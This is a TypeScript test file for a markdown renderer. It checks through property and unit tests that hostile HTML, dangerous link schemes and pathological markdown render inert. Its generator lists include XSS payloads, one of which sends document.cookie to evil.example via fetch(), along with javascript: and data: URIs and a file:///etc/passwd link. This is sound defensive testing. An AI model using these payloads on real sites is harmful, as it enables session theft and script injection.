/**
 * The markdown renderer (contract §9.1, PM-03): T-ui-renderer and unit tests.
 *
 * The property test feeds random markdown mixed with hostile HTML and hostile
 * link destinations through the renderer and checks the rendered DOM: only the
 * renderer's own elements, no event-handler attributes, no `href`/`src`/`style`,
 * and every raw HTML node shown as its literal text.
 */

import type { Nodes } from 'mdast';
import { fireEvent, render } from '@testing-library/react';

import { installShowcaseBackend } from '../lib/commands';
import type { CommandName } from '../lib/commands';
import { setShowcaseModeForTests } from '../lib/mode';
import { assert, assertDeepEqual, assertEqual, domTest, property, test } from '../test/harness';
import type { Rng } from '../test/harness';
import { MAX_RENDER_DEPTH, Markdown } from './Markdown';
import { MARKDOWN_LIMITS, linkTarget, parseMarkdown, plainTextReason } from './parse';

// ---------------------------------------------------------------------------
// What the rendered DOM may contain
// ---------------------------------------------------------------------------

const ALLOWED_TAGS = new Set([
  'div', 'p', 'span', 'a', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li',
  'blockquote', 'pre', 'code', 'em', 'strong', 'del', 'br', 'hr',
  'table', 'thead', 'tbody', 'tr', 'th', 'td', 'sup',
]);

const ALLOWED_ATTRS = new Set([
  'class', 'role', 'tabindex', 'aria-label', 'start', 'scope', 'data-align', 'data-lang', 'data-checked',
]);

const FORBIDDEN_TAGS = [
  'script', 'img', 'iframe', 'svg', 'math', 'object', 'embed', 'form', 'input',
  'style', 'link', 'meta', 'base', 'button', 'textarea', 'select', 'video', 'audio', 'source', 'frame',
];

/** Every violation of the DOM rules inside `container`, as readable strings. */
function domViolations(container: HTMLElement): string[] {
  const out: string[] = [];
  for (const el of Array.from(container.querySelectorAll('*'))) {
    const tag = el.tagName.toLowerCase();
    if (!ALLOWED_TAGS.has(tag)) out.push(`tag <${tag}>`);
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on')) out.push(`<${tag} ${name}>`);
      if (!ALLOWED_ATTRS.has(name)) out.push(`<${tag}> attribute ${name}`);
    }
  }
  for (const tag of FORBIDDEN_TAGS) {
    if (container.querySelector(tag)) out.push(`forbidden <${tag}> present`);
  }
  return out;
}

function htmlValues(node: Nodes): string[] {
  if (node.type === 'html') return [node.value];
  if ('children' in node) return node.children.flatMap((c) => htmlValues(c as Nodes));
  return [];
}

const squash = (s: string) => s.replace(/\s+/g, ' ').trim();

// ---------------------------------------------------------------------------
// Generators
// ---------------------------------------------------------------------------

const HOSTILE_HTML = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<img src="javascript:alert(1)">',
  '<iframe src="https://evil.example"></iframe>',
  '<svg onload=alert(1)><circle r=1></circle></svg>',
  '<a href="javascript:alert(1)">click</a>',
  '<style>body{display:none}</style>',
  '<object data="x.swf"></object>',
  '<embed src="x">',
  '<form action="https://evil.example"><input name=q></form>',
  '<input autofocus onfocus=alert(1)>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<details open ontoggle=alert(1)>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<link rel=stylesheet href=https://evil.example/x.css>',
  '<button formaction="javascript:alert(1)">go</button>',
  '<scr<script>ipt>alert(1)</script>',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '<!-- <script>alert(1)</script> -->',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<?xml version="1.0"?>',
  '<img src=x onerror="fetch(`https://evil.example?c=`+document.cookie)">',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '</p><script>alert(1)</script><p>',
  '<textarea>x</textarea>',
  '<video><source onerror="alert(1)"></video>',
];

const DESTINATIONS = [
  'https://example.com/docs',
  'http://example.com:8080/x?y=1#z',
  'javascript:alert(1)',
  'JaVaScRiPt:alert(1)',
  ' javascript:alert(1)',
  'java\tscript:alert(1)',
  'javascript&#58;alert(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'DATA:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
  'mailto:a@example.com',
  'https://user:pass@example.com/',
  '//evil.example/x',
  '#section',
  'src/main.rs',
  '../secret.txt',
  'https://exa mple.com',
  'https://example.com/' + 'a'.repeat(2100),
];

const MD_FRAGMENTS = [
  '# Title',
  '## Sub **bold**',
  'plain text with *emphasis* and __strong__',
  '~~gone~~',
  '`inline <b>code</b>`',
  '- item one\n- item two',
  '1. first\n2. second',
  '> quoted line',
  '- [ ] open task\n- [x] done task',
  '```html\n<script>alert(1)</script>\n```',
  '| a | b |\n| :-- | --: |\n| 1 | 2 |',
  'www.example.com and https://example.org/path',
  'a footnote[^n]\n\n[^n]: the note',
  '---',
  'line one  \nline two',
];

function pickDestination(r: Rng): string {
  return r.pick(DESTINATIONS);
}

function genSegment(r: Rng): string {
  const html = r.pick(HOSTILE_HTML);
  const dest = pickDestination(r);
  switch (r.int(0, 13)) {
    case 0:
      return html; // block HTML
    case 1:
      return `text before ${html} text after`; // inline HTML
    case 2:
      return `| col | ${html} |\n| --- | --- |\n| ${html} | x |`; // in a table
    case 3:
      return `- item ${html}\n- [ ] task ${html}`; // in a list
    case 4:
      return `*emph ${html}* and **${html}**`; // in emphasis
    case 5:
      return `[label ${html}](${dest})`; // HTML in link text
    case 6:
      return `[link](${dest} "title ${html.replace(/"/g, '')}")`;
    case 7:
      return `![alt ${r.int(0, 9)}](${dest})`;
    case 8:
      return `<${dest}>`; // autolink
    case 9:
      return `[ref][r${r.int(0, 2)}]\n\n[r${r.int(0, 2)}]: ${dest}`;
    case 10:
      return `> ${html}\n> [q](${dest})`;
    case 11:
      return `[![img](${dest})](${pickDestination(r)})`;
    case 12:
      return r.pick(MD_FRAGMENTS);
    default:
      return `${r.pick(MD_FRAGMENTS)} ${html}`;
  }
}

function genDocument(r: Rng): string {
  const n = r.int(1, 6);
  const parts: string[] = [];
  for (let i = 0; i < n; i++) parts.push(genSegment(r));
  return parts.join(r.chance(0.5) ? '\n\n' : '\n');
}

// ---------------------------------------------------------------------------
// T-ui-renderer
// ---------------------------------------------------------------------------

domTest('T-ui-renderer: random markdown and hostile HTML never render markup, handlers or URLs', async () => {
  let htmlNodes = 0;
  await property(
    'renderer',
    (r) => genDocument(r),
    (doc) => {
      const view = render(<Markdown text={doc} />);
      try {
        const root = view.container;
        const problems = domViolations(root);
        assert(problems.length === 0, `DOM violations: ${problems.join('; ')}`);
        const text = squash(root.textContent ?? '');
        for (const value of htmlValues(parseMarkdown(doc))) {
          htmlNodes++;
          assert(text.includes(squash(value)), `raw HTML shown as text: ${value}`);
        }
      } finally {
        view.unmount();
      }
    },
    { runs: 600 },
  );
  assert(htmlNodes > 300, `the generator produced raw HTML nodes (${htmlNodes})`);
});

// ---------------------------------------------------------------------------
// Link rules
// ---------------------------------------------------------------------------

test('linkTarget: only http/https without userinfo are web links', () => {
  assertDeepEqual(
    linkTarget('https://example.com/docs'),
    { kind: 'web', url: 'https://example.com/docs', host: 'example.com' },
    'https',
  );
  assertEqual(linkTarget('http://example.com:8080/x').kind, 'web', 'http with a port');
  for (const bad of [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,x',
    'vbscript:x',
    'file:///etc/passwd',
    'mailto:a@example.com',
    'https://user:pass@example.com/',
    'https://user@example.com/',
    '//evil.example/x',
    '#frag',
    '?q=1',
    '',
    'https://example.com/' + 'a'.repeat(2100),
    'localhost:3000',
  ]) {
    assertEqual(linkTarget(bad).kind, 'inert', `inert: ${JSON.stringify(bad.slice(0, 40))}`);
  }
  assertDeepEqual(linkTarget('src/main.rs'), { kind: 'path', path: 'src/main.rs' }, 'a relative path');
  assertDeepEqual(linkTarget('./a%20b.md'), { kind: 'path', path: './a b.md' }, 'percent-decoded path');
  assertEqual(linkTarget('/Users/x/notes.md').kind, 'path', 'an absolute path');
  assertEqual(linkTarget('~/notes.md').kind, 'path', 'a home path');
  assertEqual(linkTarget('word').kind, 'inert', 'a bare word is not a path');
  assertEqual(linkTarget(null).kind, 'inert', 'no destination');
});

domTest('links: text plus the host in parentheses; no href', () => {
  const { container } = render(<Markdown text="See [the docs](https://example.com/a/b)." />);
  const link = container.querySelector('[role="link"]');
  assert(link !== null, 'an activatable link');
  assertEqual(link?.textContent, 'the docs (example.com)', 'text and host');
  assert(!link?.hasAttribute('href'), 'no href: the WebView never navigates');
  assertEqual(link?.getAttribute('tabindex'), '0', 'keyboard reachable');
  assert((link?.getAttribute('aria-label') ?? '').includes('example.com'), 'the name carries the host');
  assertEqual(container.querySelectorAll('[href]').length, 0, 'no href anywhere');
});

domTest('links: javascript:, data:, file: and userinfo destinations are plain text', () => {
  const doc = [
    '[a](javascript:alert(1))',
    '[b](data:text/html,x)',
    '[c](file:///etc/passwd)',
    '[d](https://user:pw@example.com/)',
    '<javascript:alert(1)>',
  ].join('\n\n');
  const { container } = render(<Markdown text={doc} />);
  assertEqual(container.querySelectorAll('[role="link"]').length, 0, 'nothing activatable');
  // `<javascript:alert(1)>` is a CommonMark autolink (any scheme), so it is a
  // link node too, and inert like the others.
  assertEqual(container.querySelectorAll('.md-link-inert').length, 5, 'five inert links');
  assert((container.textContent ?? '').includes('javascript:alert(1)'), 'the bad autolink stays visible as text');
});

async function withLinkBackend(run: (calls: { name: CommandName; req: unknown }[]) => Promise<void> | void) {
  const calls: { name: CommandName; req: unknown }[] = [];
  setShowcaseModeForTests(true);
  installShowcaseBackend(async (name, req) => {
    calls.push({ name, req });
    return { opened: true };
  });
  try {
    await run(calls);
  } finally {
    installShowcaseBackend(null);
    setShowcaseModeForTests(null);
  }
}

domTest('links: a click on an http link calls link_open exactly once with the URL', async () => {
  await withLinkBackend(async (calls) => {
    const { container } = render(<Markdown text="[go](https://example.com/x)" />);
    const link = container.querySelector('[role="link"]') as HTMLElement;
    fireEvent.click(link);
    assertEqual(calls.length, 1, 'one call');
    assertEqual(calls[0]?.name, 'link_open', 'link_open');
    assertDeepEqual(calls[0]?.req, { url: 'https://example.com/x' }, 'with the URL');
  });
});

domTest('links: Enter and Space activate; key repeat and IME composition do not', async () => {
  await withLinkBackend(async (calls) => {
    const { container } = render(<Markdown text="[go](https://example.com/x)" />);
    const link = container.querySelector('[role="link"]') as HTMLElement;
    fireEvent.keyDown(link, { key: 'Enter', code: 'Enter' });
    fireEvent.keyDown(link, { key: ' ', code: 'Space' });
    fireEvent.keyDown(link, { key: 'Enter', code: 'Enter', repeat: true });
    fireEvent.keyDown(link, { key: 'Enter', code: 'Enter', isComposing: true });
    fireEvent.keyDown(link, { key: 'Enter', code: 'Enter', keyCode: 229 });
    assertEqual(calls.length, 2, 'Enter and Space only');
  });
});

domTest('links: a rejected link_open goes to onLinkError, never throws', async () => {
  const errors: unknown[] = [];
  setShowcaseModeForTests(true);
  installShowcaseBackend(async () => {
    throw 'platform said no';
  });
  try {
    const { container } = render(<Markdown text="[go](https://example.com/)" onLinkError={(e) => errors.push(e)} />);
    // No React state changes here, so no async act wrapper (it leaves
    // MessagePorts open in the bundled build): the rejection reaches
    // onLinkError once the promise chain settles.
    fireEvent.click(container.querySelector('[role="link"]') as HTMLElement);
    await new Promise((r) => setTimeout(r, 0));
    assertEqual(errors.length, 1, 'reported once');
    assertEqual((errors[0] as { code?: string }).code, 'INTERNAL', 'as an IpcError');
  } finally {
    installShowcaseBackend(null);
    setShowcaseModeForTests(null);
  }
});

domTest('links: file paths are activatable only through onOpenPath', () => {
  const plain = render(<Markdown text="[main](src/main.rs)" />);
  assertEqual(plain.container.querySelectorAll('[role="link"]').length, 0, 'text without onOpenPath');
  plain.unmount();

  const opened: string[] = [];
  const { container } = render(<Markdown text="[main](src/main.rs)" onOpenPath={(p) => opened.push(p)} />);
  const link = container.querySelector('[role="link"]') as HTMLElement;
  assert(link !== null, 'activatable with onOpenPath');
  fireEvent.click(link);
  assertDeepEqual(opened, ['src/main.rs'], 'the path is handed to the screen');
});

domTest('links: a nested link or image inside a link is text, never a nested control', () => {
  const { container } = render(<Markdown text="[![logo](https://example.com/l.png)](https://example.com/)" />);
  assertEqual(container.querySelectorAll('[role="link"]').length, 1, 'one control');
  assertEqual(container.querySelectorAll('[role="link"] [role="link"]').length, 0, 'none nested');
});

// ---------------------------------------------------------------------------
// Images, tasks, code, tables, headings
// ---------------------------------------------------------------------------

domTest('images: rendered as a link labelled with the alt text, never fetched', () => {
  const { container } = render(<Markdown text="![diagram](https://example.com/d.png) ![x](javascript:alert(1))" />);
  assertEqual(container.querySelectorAll('img').length, 0, 'no <img>');
  assertEqual(container.querySelectorAll('[src]').length, 0, 'no src');
  const link = container.querySelector('[role="link"]');
  assert((link?.textContent ?? '').includes('diagram'), 'the alt text is shown');
  assert((link?.textContent ?? '').includes('(example.com)'), 'with its host');
  assertEqual(container.querySelectorAll('[role="link"]').length, 1, 'the javascript: image is inert');
});

domTest('task lists: drawn checkboxes with names, no form controls', () => {
  const { container } = render(<Markdown text={'- [ ] open\n- [x] done'} />);
  assertEqual(container.querySelectorAll('input').length, 0, 'no <input>');
  const checks = Array.from(container.querySelectorAll('.md-check'));
  assertEqual(checks.length, 2, 'two checkboxes');
  assertEqual(checks[0]?.getAttribute('data-checked'), 'false', 'first open');
  assertEqual(checks[1]?.getAttribute('data-checked'), 'true', 'second done');
  for (const c of checks) {
    assertEqual(c.getAttribute('role'), 'img', 'role img');
    assert((c.getAttribute('aria-label') ?? '') !== '', 'named');
  }
  assert(checks[0]?.getAttribute('aria-label') !== checks[1]?.getAttribute('aria-label'), 'done and open differ');
});

domTest('code blocks keep their text verbatim, HTML included', () => {
  const code = '<script>alert(1)</script>\n  indented & <b>bold</b>';
  const { container } = render(<Markdown text={'```html\n' + code + '\n```'} />);
  const el = container.querySelector('pre code');
  assertEqual(el?.textContent, code, 'verbatim');
  assertEqual(el?.getAttribute('data-lang'), 'html', 'language kept as data');
  assertEqual(container.querySelectorAll('script, b').length, 0, 'no markup');
  const group = container.querySelector('.md-codeblock');
  assertEqual(group?.getAttribute('role'), 'group', 'a named group');
});

domTest('raw HTML is literal text, inline and as a block', () => {
  const { container } = render(<Markdown text={'<div onclick="x()">block</div>\n\ninline <b>bold</b> end'} />);
  assertEqual(container.querySelectorAll('b, [onclick]').length, 0, 'no markup');
  const text = container.textContent ?? '';
  assert(text.includes('<div onclick="x()">block</div>'), 'the block is shown');
  assert(text.includes('<b>') && text.includes('</b>'), 'the inline tags are shown');
});

domTest('tables: head cells with scope, body cells, alignment as data', () => {
  const { container } = render(<Markdown text={'| a | b | c |\n| :-- | :-: | --: |\n| 1 | 2 | 3 |\n| 4 | 5 | 6 |'} />);
  const ths = Array.from(container.querySelectorAll('thead th'));
  assertEqual(ths.length, 3, 'three head cells');
  for (const th of ths) assertEqual(th.getAttribute('scope'), 'col', 'scope col');
  assertDeepEqual(
    ths.map((th) => th.getAttribute('data-align')),
    ['left', 'center', 'right'],
    'alignment',
  );
  assertEqual(container.querySelectorAll('tbody tr').length, 2, 'two body rows');
  assertEqual(container.querySelectorAll('tbody td').length, 6, 'six body cells');
});

domTest('headings start at headingBase and cap at h6', () => {
  const doc = '# one\n\n## two\n\n###### six';
  const a = render(<Markdown text={doc} />);
  assertEqual(a.container.querySelector('h3')?.textContent, 'one', '# → h3 by default');
  assertEqual(a.container.querySelector('h4')?.textContent, 'two', '## → h4');
  assertEqual(a.container.querySelectorAll('h1, h2').length, 0, 'no page-level heading');
  assertEqual(a.container.querySelectorAll('h6').length, 1, '###### capped at h6');
  a.unmount();
  const b = render(<Markdown text={doc} headingBase={2} />);
  assertEqual(b.container.querySelector('h2')?.textContent, 'one', 'headingBase 2');
});

domTest('lists: tight items have no paragraph; ordered start kept', () => {
  const { container } = render(<Markdown text={'3. three\n4. four\n\n- a\n- b'} />);
  assertEqual(container.querySelector('ol')?.getAttribute('start'), '3', 'start');
  assertEqual(container.querySelectorAll('li p').length, 0, 'tight lists unwrap paragraphs');
  assertEqual(container.querySelectorAll('li').length, 4, 'four items');
});

domTest('GFM: strikethrough, autolink literals, footnotes as text', () => {
  const { container } = render(<Markdown text={'~~old~~ www.example.com\n\nnote[^1]\n\n[^1]: the note'} />);
  assertEqual(container.querySelector('del')?.textContent, 'old', 'strikethrough');
  const link = container.querySelector('[role="link"]');
  assert((link?.textContent ?? '').includes('example.com'), 'autolink literal');
  assertEqual(container.querySelector('.md-fnref')?.textContent, '[1]', 'footnote reference');
  assert((container.querySelector('.md-footnote')?.textContent ?? '').includes('the note'), 'footnote text');
});

domTest('a 2,000-line document renders within a generous budget', () => {
  const lines: string[] = [];
  for (let i = 0; i < 2000; i++) {
    switch (i % 8) {
      case 0:
        lines.push(`## Section ${i}`);
        break;
      case 1:
        lines.push(`Text with **bold**, *em*, \`code\` and [a link](https://example.com/${i}).`);
        break;
      case 2:
        lines.push(`- item ${i} <span>raw</span>`);
        break;
      case 3:
        lines.push(`- [x] task ${i}`);
        break;
      case 4:
        lines.push('');
        break;
      case 5:
        lines.push(`| a${i} | b |`);
        break;
      case 6:
        lines.push('| --- | --- |');
        break;
      default:
        lines.push('');
    }
  }
  const doc = lines.join('\n');
  const started = performance.now();
  const { container } = render(<Markdown text={doc} />);
  const ms = performance.now() - started;
  assert(container.querySelectorAll('*').length > 1000, 'it rendered');
  assert(ms < 8000, `rendered in ${Math.round(ms)} ms (budget 8000 ms under happy-dom)`);
  assertEqual(domViolations(container).length, 0, 'still clean');
});


// ---------------------------------------------------------------------------
// Pathological input (a hostile agent must not freeze or crash the view)
// ---------------------------------------------------------------------------

/** CPU milliseconds spent by `run` (wall clock is unusable on a loaded machine). */
function cpuMs(run: () => void): number {
  const before = process.cpuUsage();
  run();
  const used = process.cpuUsage(before);
  return (used.user + used.system) / 1000;
}

const HOSTILE: [string, string][] = [
  ['20,000 nested quotes (overflows the parser stack)', '>'.repeat(20_000) + ' x'],
  ['a 30,000-star run', '*'.repeat(30_000) + 'x' + '*'.repeat(30_000)],
  ['16,000 alternating underscores', '_a'.repeat(16_000)],
  ['300 nested list levels', Array.from({ length: 300 }, (_, i) => ' '.repeat(i * 2) + '- a').join('\n')],
  ['2,000 nested links', '['.repeat(2_000) + 'x' + '](u)'.repeat(2_000)],
  ['a 2,000-column table', '|' + 'a|'.repeat(2_000) + '\n|' + '-|'.repeat(2_000) + '\n|' + 'x|'.repeat(2_000)],
  ['over 100,000 characters', 'word '.repeat(25_000)],
];

domTest('pathological markdown is shown as plain text, fast, with nothing lost', () => {
  for (const [name, text] of HOSTILE) {
    assert(plainTextReason(text) !== null, `${name}: detected`);
    let container: HTMLElement | null = null;
    const ms = cpuMs(() => {
      container = render(<Markdown text={text} />).container;
    });
    const root = (container as HTMLElement | null)?.querySelector('.md');
    assertEqual(root?.getAttribute('data-plain'), 'true', `${name}: plain text`);
    assertEqual(root?.textContent, text, `${name}: the whole text is shown`);
    assert(ms < 2_000, `${name}: rendered in ${ms.toFixed(0)} ms of CPU (budget 2 s)`);
  }
});

test('ordinary documents stay below every limit', () => {
  const doc = [
    '# Plan',
    '> note',
    '> > nested once',
    '- a',
    '  - b',
    '    - c',
    '| a | b |',
    '|---|---|',
    '| 1 | 2 |',
    '**bold** and _em_ and `snake_case_name` and [link](https://example.com)',
    '---',
    '___',
    '```',
    '*'.repeat(200) + ' inside a fence ' + '['.repeat(2_000),
    '```',
  ].join('\n');
  assertEqual(plainTextReason(doc), null, 'parsed as markdown');
  assertEqual(plainTextReason('>'.repeat(MARKDOWN_LIMITS.quoteDepth) + ' x'), null, 'the quote limit itself is allowed');
  assertEqual(plainTextReason('>'.repeat(MARKDOWN_LIMITS.quoteDepth + 1) + ' x'), 'quoteDepth', 'one more is not');
  assertEqual(plainTextReason('*'.repeat(MARKDOWN_LIMITS.delimiterRun + 1) + 'x'), 'delimiterRun', 'a long run');
  assertEqual(plainTextReason('_'.repeat(80)), null, 'a rule line of 80 underscores is a rule, not a run');
});

domTest('nesting deeper than the render cap renders as text without crashing', () => {
  // Allowed by the pre-check (8 quotes, lists of 16 levels, emphasis runs of 16),
  // together deeper than MAX_RENDER_DEPTH elements.
  const lists = Array.from({ length: 16 }, (_, i) => ' '.repeat(i * 3) + '- ' + '*'.repeat(16) + 'deep' + '*'.repeat(16)).join('\n');
  const text = '>'.repeat(8) + ' quoted\n\n' + lists.split('\n').map((l) => '>'.repeat(8) + ' ' + l).join('\n');
  assertEqual(plainTextReason(text), null, 'not caught by the pre-check');
  const { container } = render(<Markdown text={text} />);
  assert((container.textContent ?? '').includes('deep'), 'the text is there');
  let depth = 0;
  let deepest = 0;
  const walk = (el: Element) => {
    depth++;
    deepest = Math.max(deepest, depth);
    for (const child of Array.from(el.children)) walk(child);
    depth--;
  };
  walk(container);
  assert(deepest <= MAX_RENDER_DEPTH * 2 + 4, `element depth ${deepest} stays bounded`);
});
